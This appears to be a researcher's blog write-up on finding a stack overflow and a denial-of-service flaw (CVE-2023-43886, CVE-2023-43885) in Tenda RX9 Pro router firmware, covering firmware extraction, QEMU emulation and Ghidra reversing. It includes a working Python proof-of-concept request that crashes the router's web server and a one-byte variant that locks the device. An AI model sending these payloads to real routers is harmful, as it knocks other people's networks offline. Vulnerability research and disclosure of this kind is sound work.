---
layout: post
title: Tenda RX9 PRO - Stack Overflow Vulnerability + DoS | CVE-2023-43886 and CVE-2023-43885
---

This post will describe how I found this vulnerability and give step by step instructions to follow.  
It was found on September 19th on the Firmware version `V22.03.02.20`

## Extracting the Firmare
Extracting the firmware is nothing complicated.

Once downloaded the zip from the [official site](https://www.tendacn.com/download/detail-4514.html), put it in a folder and run `binwalk -Me ./` to extract all
of its contents.

Once done, you can find the root folder at `_US_RX9ProV1.0in_V22.03.02.20_multi_TDE01.bin.extracted/squashfs-root`

## Setting up the scene for easier testing with QEMU
The target http server binary is in `/usr/sbin/httpd`, running `file` on it shows:

```
./usr/sbin/httpd: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-mips-sf.so.1, no section header
```

Pro tip: If you struggle to find the `httpd` executable, you can just `grep -r AdvGetMacMtuWan`. The string im searching for comes from `/www/goform/`, ALL the files in there correspond to a funciton (and a string) in the main executable :> Very handy

Therefore we need a mips QEMU to run this. Since the whole code is made to be run having the File System Root as the image root, we will use a `static` version of qemu, copied into the root:

Install Qemu with:

```sh
apt-get install qemu-system qemu-user-static

cp $(which qemu-mips-static) ./
```

Command to execute HTTP Server:

```sh
sudo chroot ./ ./qemu-mips-static ./usr/sbin/httpd
```

You can now test around if you want... However, not everything will be functioning

## Starting the reversing
After we have a functioning server so we can test our payloads faster, we take the `httpd` executable and throw it in Ghidra.

As noted before, this executable will contain all the filenames (without the `.txt`) contained in `/www/goform/`, therefore we can use Ghidra to find that string and follow its only XREF

![string xref in Ghidra](/images/tenda/StringXREF.png)

I have already renamed some functions, but this clearly just binds all files to the corresponding function in the executable.

![bindAll function](/images/tenda/bindAllFunction.png)

From here we just go to random functions, taking what by logic could take some inputs...
This part is the time consuming part and also the part that seems like magic to the readers, basically it's nothing but reading reversed code until you find something, rarely it is fast but we will skip over all the functions I reversed for nothing :>

## The interesting function
After a few reversed functions, I set my eyes on one that looked at least a bit interesting: `SetOnlineDevName`.

We see the parameters `mac` and `devName` (the function was renamed by me, you will however easily notice that this is the parameters function by seeing how it's always called at the beginning of every `Set` operation with a string and the parameter as inputs)

![params](/images/tenda/getParam.png)

Following this parameter (to highlight a variable in all the decompilation in Ghidra, press the middle mouse button on it) we see that it gets passed in a function call to an external function...

Time to reverse the library too! :D

Maybe a little "ignorant" but this is the way that I found the correct library exporting the function I wanted:

```sh
readelf -d ./usr/sbin/httpd
grep -r update_dev_name
```

![finding libs](/images/tenda/findingLib.png)

I'm sure there's better ways, but oh well, it's `libtd_server.so` :P

Well, it doesn't take much to locate the function here since it's exported and therefore we already have its name in the symbols...

The first thing that catches my eye is that function call where the only length that was given is the length of the input, without considering the length of the other parameter which... mmh...

The condition to reach it is very simple, it checks if the encoding is chinese (cn) (this can be found in `libcommon.so`) and if it is then it runs that function... 

![update_dev_name](/images/tenda/vuln.png)

The fun part is that any other path actually uses the correct length:

![correct length](/images/tenda/others.png)


So let's prepare a test payload and a script to quickly test this:

```py
import requests


addr: str = "127.0.0.1"  # 192.168.1.206


def payload(s: requests.Session):
	data = {
		'mac': 'A' * 0x1F,
		'devName': '中' * 128 + 'A'*1024,
	}
	
	# This will hang forever
	s.post(f'http://{addr}/goform/SetOnlineDevName', data=data)


def login(s: requests.Session, username: str, password: str):

    # The Password is sent pre-hashed from the page,
    # you might just want to grab it from the dev tools on your browser
	data = {
		'username': username,
		'password': password,
	}
	s.post(f'http://{addr}/login/Auth', data=data)


if __name__ == "__main__":
	s = requests.Session()
	login(s, "admin", "YOURPASSWORDHERE")
	payload(s)

```

Sending this to your locally running (or actual device) httpd process will effectively give you a nice `segmantation fault (core dumped)` :>

![gdb](/images/tenda/gdb.png)

Remember that gdb uses your host's Endianess, which for x86 is Little Endian while the binary is Big Endian (and I didn't set it in the above screenshot).

This was assigned CVE-2023-43886

### Bonus
As a bonus DoS attack, if you send a `mac` of just 1 more byte than what I've put in the code above you will effectively send the router in a `trap()` which will lock the router until it is restarted. This was assigned CVE-2023-43885
